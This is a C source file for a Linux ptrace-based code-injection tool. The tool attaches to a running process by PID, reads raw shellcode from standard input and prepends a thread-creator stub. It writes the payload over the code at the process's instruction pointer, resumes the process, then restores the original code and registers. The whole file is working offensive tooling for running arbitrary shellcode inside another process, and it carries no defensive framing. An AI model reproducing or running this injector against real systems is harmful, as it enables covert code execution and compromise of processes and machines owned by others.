/* oblique 2010 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include "payloads.h"

typedef enum { a_unknown = 0, a_x86_32, a_x86_64 } arch_t;

#ifdef __x86_64__
#define EHDR_START32    ((void*)0x08048000)
#define EHDR_START64    ((void*)0x400000)
#define IP_REG(X)       ((void*)(X).rip)
arch_t getarch(pid_t pid);
#else
#define IP_REG(X)       ((void*)(X).eip)
#endif

int isnumeric(char *s);
int readmem(pid_t pid, void *buf, void *addr, size_t size);
int writemem(pid_t pid, void *buf, void *addr, size_t size);
ssize_t init_payload(arch_t arch, unsigned char **p, unsigned char *sc, size_t sc_len);
ssize_t read_sc(unsigned char **sc);


int main(int argc, char *argv[]) {
    pid_t pid;
    struct user_regs_struct regs;
    unsigned char *original_code, *payload, *sc;
    size_t p_len, sc_len, ret=0;
#ifdef __x86_64__
    arch_t arch;
#endif


    if (argc != 2) {
        printf("[-] Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    if (!isnumeric(argv[1])) {
        printf("[-] Pid must contains only numbers!\n");
        return 1;
    }

    pid = atoi(argv[1]);

    printf("[+] Reading shellcode\n");

    sc = NULL;
    if ((sc_len = read_sc(&sc)) == -1)
        return 1;

    printf("[+] Shellcode size = %zu\n", sc_len);

    printf("[+] Attaching to %d\n", pid);
    /* attach to the process */
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("[-] ptrace");;
        free(sc);
        return 1;
    }

    printf("[+] Waiting the child to stop\n");
    /* wait the child to stop */
    if (wait(NULL) == -1) {
        perror("[-] wait");
        free(sc);
        return 1;
    }

#ifdef __i386__
    printf("[+] Initialize payload\n");
    if ((p_len = init_payload(a_x86_32, &payload, sc, sc_len)) == -1) {
        free(sc);
        return 1;
    }
#else
    printf("[+] Getting the architecture .. ");
    fflush(stdout);
    if ((arch = getarch(pid)) == a_unknown) {
        printf("unknown\n");
        fprintf(stderr, "[-] Unknown architecture\n");
        free(sc);
        return 1;
    } else {
        if (arch == a_x86_32)
            printf("x86-32\n");
        else if (arch == a_x86_64)
            printf("x86-64\n");
        printf("[+] Initialize payload\n");
        if ((p_len = init_payload(arch, &payload, sc, sc_len)) == -1) {
            free(sc);
            return 1;
        }
    }
#endif

    original_code = calloc(sizeof(unsigned char), p_len);
    if (original_code == NULL) {
        perror("[-] calloc");
        free(payload);
        free(sc);
        return 1;
    }

    sleep(1);

    printf("[+] Getting the registers\n");
    /* save the registers */
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    printf("[+] Execution stoped at %p\n", IP_REG(regs));

    /* save the original code */
    printf("[+] Saving original code\n");
    if (readmem(pid, original_code, IP_REG(regs), p_len) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    /* inject the payload */
    printf("[+] Injecting payload\n");
    if (writemem(pid, payload, IP_REG(regs), p_len) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    printf("[+] Resume execution\n");
    /* tell to the process to continue */
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    printf("[+] Waiting the child to stop\n");
    /* wait the child to stop */
    if (wait(NULL) == -1) {
        printf("[-] wait");
        free(payload);
        free(sc);
        return 1;
    }

    sleep(1);

    printf("[+] Restoring original code\n");
    /* restore the original code */
    if (writemem(pid, original_code, IP_REG(regs), p_len) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    printf("[+] Restoring registers\n");
    /* restore the registers */
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        printf("[-] ptrace");
        free(sc);
        free(payload);
        return 1;
    }

    printf("[+] Detaching\n");
    /* detach from the process */
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("[-] ptrace");
        free(payload);
        free(sc);
        return 1;
    }

    printf("[+] Code injection success!\n");
    free(payload);
    free(sc);

    return 0;
}

int readmem(pid_t pid, void *buf, void *addr, size_t size) {
    size_t i = 0, j = size%sizeof(long);

    if (j != 0) {
        errno = 0;
        long tmp = ptrace(PTRACE_PEEKDATA, pid, addr, NULL);
        if (errno != 0)
            return -1;
        memcpy(buf, &tmp, j);
        i += j;
    }
    while (i < size) {
        errno = 0;
        *(long*)(buf+i) = ptrace(PTRACE_PEEKDATA, pid, addr+i, NULL);
        if (errno != 0)
            return -1;
        i += sizeof(long);
    }
    return 0;
}

int writemem(pid_t pid, void *buf, void *addr, size_t size) {
    size_t i = 0, j = size%sizeof(long);
    
    if (j != 0) {
        errno = 0;
        long tmp = ptrace(PTRACE_PEEKDATA, pid, addr, NULL);
        if (errno != 0)
            return -1;
        memcpy(&tmp, buf, j);
        if (ptrace(PTRACE_POKEDATA, pid, addr, tmp) == -1)
            return -1;
        i += j;
    }
    while (i < size) {
        if (ptrace(PTRACE_POKEDATA, pid, addr+i, *(long*)(buf+i)) == -1)
            return -1;
        i += sizeof(long);
    }
    return 0;
}

ssize_t init_payload(arch_t arch, unsigned char **p, unsigned char *sc, size_t sc_len) {
    size_t p_len, tc_len, i;
    
    if (arch == a_x86_32)
        tc_len = thread_creator_32_bin_len;
#ifdef __x86_64__
    else if (arch == a_x86_64)
        tc_len = thread_creator_64_bin_len;
#endif
    
    p_len = sc_len + tc_len;

    *p = malloc(sizeof(unsigned char) * p_len);
    if (*p == NULL) {
        perror("[-] malloc");
        return -1;
    }

    if (arch == a_x86_32)
        memcpy(*p, thread_creator_32_bin, tc_len);
#ifdef __x86_64__
    else if (arch == a_x86_64)
        memcpy(*p, thread_creator_64_bin, tc_len);
#endif

    for (i=0; i<tc_len; i++)
        if (memcmp(*p+i, "\xad\xde\xe1\xfe", 4) == 0)
            memcpy(*p+i, (void*)&sc_len, 4);

    memcpy(*p+tc_len, sc, sc_len);

    return p_len;
}


ssize_t read_sc(unsigned char **sc) {
    unsigned char buf[4096], *re = NULL;
    size_t sz = 0, sc_len = 0;
    ssize_t r = 0;

    if (*sc != NULL) {
        free(*sc);
        *sc = NULL;
    }

    while ((r = read(STDIN_FILENO, buf, sizeof(buf))) > 0) {
        if (r+sc_len > sz) {
            re = realloc(*sc, sz+r);
            if (re == NULL) {
                free(*sc);
                *sc = NULL;
                perror("[-] realloc");
                return -1;
            }
            sz += r;
            *sc = re;
        }
        memcpy(*sc+sc_len, buf, r);
        sc_len += r;
    }

    if (r == -1) {
        free(*sc);
        *sc = NULL;
        perror("[-] read");
        return -1;
    }

    return sc_len;
}

#ifdef __x86_64__
arch_t getarch(pid_t pid) {
    unsigned char buf[5] = {0};
    int ret = readmem(pid, buf, EHDR_START64, 5);
    if (ret == -1)
        ret = readmem(pid, buf, EHDR_START32, 5);

    if (ret == 0) {
        if (memcmp(buf, "\177ELF\x02", 5) == 0)
            return a_x86_64;
        else if (memcmp(buf, "\177ELF\x01", 5) == 0)
            return a_x86_32;
    }
    return a_unknown;
}
#endif

int isnumeric(char *s) {
    if (s == NULL)
        return 0;
    if (*s == '\0')
        return 0;

    while (*s) {
        if (*s < '0' || *s > '9')
            return 0;
        s++;
    }
    return 1;
}
